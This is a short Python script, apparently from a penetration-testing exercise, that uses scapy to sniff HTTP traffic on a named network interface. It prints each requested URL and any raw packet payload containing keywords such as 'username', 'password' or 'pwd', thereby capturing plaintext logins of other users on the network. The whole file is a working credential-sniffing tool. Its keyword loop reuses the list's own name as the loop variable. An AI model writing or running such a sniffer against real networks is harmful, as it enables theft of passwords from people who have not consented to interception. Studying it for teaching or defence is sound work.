#!/usr/bin/env python

import scapy.all
from scapy.layers import http
import optparse


def get_args():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface to listen to")
    options, arguments = parser.parse_args()

    if not options.interface:
        parser.error("[-] Please specify an interface to listen to to do so use -i [INTERFACE] or --interface ["
                     "INTERFACE] or use --help for more info")
    return options


def sniff(interface):
    try:
        scapy.all.sniff(iface=interface, store=False, prn=process_packet)
    except IOError:
        print("[+] No such network. Please specify a valid interface")


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_credentials(packet):
    if packet.haslayer(scapy.all.Raw):
        load = packet[scapy.all.Raw].load
        interesting_keywords = ["username", "user", "login", "password", "pass", "pwd", "logon", "uname", "id"]
        for interesting_keywords in interesting_keywords:
            if interesting_keywords in load:
                return load


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):

        url = get_url(packet)
        credentials = get_credentials(packet)

        print("[+] HTTP Request ==> " + url)
        if credentials:
            print("[+] Found username and/or password! ==> " + credentials)


interface_to_sniff = get_args().interface
print("Sniffing on " + interface_to_sniff)
sniff(interface_to_sniff)

